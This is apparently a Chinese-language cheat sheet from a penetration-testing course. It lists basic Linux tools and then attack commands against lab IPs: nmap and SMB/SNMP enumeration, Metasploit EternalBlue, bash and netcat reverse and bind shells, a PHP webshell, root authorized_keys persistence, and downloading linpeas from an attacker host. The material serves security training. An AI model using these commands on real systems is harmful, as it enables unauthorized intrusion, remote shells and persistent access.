## 基本工具

| **命令**   | **描述**   |
| --------------|-------------------|
| **通用** |
| `sudo openvpn user.ovpn` | 连接到VPN |
| `ifconfig`/`ip a` | 显示我们的IP地址 |
| `netstat -rn` | 显示通过VPN可访问的网络 |
| `ssh user@10.10.10.10` | SSH到远程服务器 |
| `ftp 10.129.42.253` | FTP到远程服务器 |
| **tmux** |
| `tmux` | 启动tmux |
| `ctrl+b` | tmux：默认前缀 |
| `prefix c` | tmux：新建窗口 |
| `prefix 1` | tmux：切换到窗口（`1`） |
| `prefix shift+%` | tmux：垂直分割面板 |
| `prefix shift+"` | tmux：水平分割面板 |
| `prefix ->` | tmux：切换到右侧面板 |
| **Vim** |
| `vim file` | vim：用vim打开`file` |
| `esc+i` | vim：进入`插入`模式 |
| `esc` | vim：返回`正常`模式 |
| `x` | vim：剪切字符 |
| `dw` | vim：剪切单词 |
| `dd` | vim：剪切整行 |
| `yw` | vim：复制单词 |
| `yy` | vim：复制整行 |
| `p` | vim：粘贴 |
| `:1` | vim：跳转到第1行 |
| `:w` | vim：写入文件（保存） |
| `:q` | vim：退出 |
| `:q!` | vim：强制退出，不保存 |
| `:wq` | vim：写入并退出 |

## 渗透测试
| **命令**   | **描述**   |
| --------------|-------------------|
| **服务扫描** |
| `nmap 10.129.42.253` | 在IP上运行nmap |
| `nmap -sV -sC -p- 10.129.42.253` | 在IP上运行nmap脚本扫描 |
| `locate scripts/citrix` | 列出各种可用的nmap脚本 |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | 在IP上运行nmap脚本 |
| `netcat 10.10.10.10 22` | 获取开放端口的标语 |
| `smbclient -N -L \\\\10.129.42.253` | 列出SMB共享 |
| `smbclient \\\\10.129.42.253\\users` | 连接到SMB共享 |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | 扫描IP上的SNMP |
| `onesixtyone -c dict.txt 10.129.42.254` | 暴力破解SNMP密钥字符串 |
| **Web枚举** |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | 对网站运行目录扫描 |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | 对网站运行子域扫描 |
| `curl -IL https://www.inlanefreight.com` | 获取网站标语 |
| `whatweb 10.10.10.121` | 列出有关web服务器/证书的详细信息 |
| `curl 10.10.10.121/robots.txt` | 列出`robots.txt`中的潜在目录 |
| `ctrl+U` | 查看页面源代码（在Firefox中） |
| **公开利用** |
| `searchsploit openssh 7.2` | 搜索Web应用程序的公开利用 |
| `msfconsole` | MSF：启动Metasploit框架 |
| `search exploit eternalblue` | MSF：在MSF中搜索公开利用 |
| `use exploit/windows/smb/ms17_010_psexec` | MSF：开始使用MSF模块 |
| `show options` | MSF：显示MSF模块的所需选项 |
| `set RHOSTS 10.10.10.40` | MSF：为MSF模块选项设置值 |
| `check` | MSF：测试目标服务器是否存在漏洞 |
| `exploit` | MSF：在目标服务器上运行利用 |
| **使用Shell** |
| `nc -lvnp 1234` | 在本地端口上启动`nc`监听器 |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | 从远程服务器发送反向Shell |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | 另一种从远程服务器发送反向Shell的命令 |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | 在远程服务器上启动绑定Shell |
| `nc 10.10.10.1 1234` | 连接到远程服务器上启动的绑定Shell |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | 升级Shell TTY（1） |
| `ctrl+z`，然后`stty raw -echo`，然后`fg`，然后两次`enter` | 升级Shell TTY（2） |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | 创建一个Webshell php文件 |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | 在上传的Webshell上执行命令 |
| **提权** |
| `./linpeas.sh` | 运行`linpeas`脚本来枚举远程服务器 |
| `sudo -l` | 列出可用的`sudo`权限 |
| `sudo -u user /bin/echo Hello World!` | 使用`sudo`运行命令 |
| `sudo su -` | 切换到root用户（如果我们有`sudo su`访问权限） |
| `sudo su user -` | 切换到用户（如果我们有`sudo su`访问权限） |
| `ssh-keygen -f key` | 创建一个新的SSH密钥 |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | 将生成的公钥添加到用户 |
| `ssh root@10.10.10.10 -i key` | 使用生成的私钥SSH到服务器 |
| **文件传输** |
| `python3 -m http.server 8000` | 启动本地Web服务器 |
| `wget http://10.10.14.1:8000/linpeas.sh` | 从本地机器上下载文件到远程服务器 |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | 从本地机器上下载文件到远程服务器 |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | 使用`scp`将文件传输到远程服务器（需要SSH访问权限） |
| `base64 shell -w 0` | 将文件转换为`base64` |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | 将文件从`base64`转换回其原始格式 |
| `md5sum shell` | 检查文件的`md5sum`以确保转换正确 |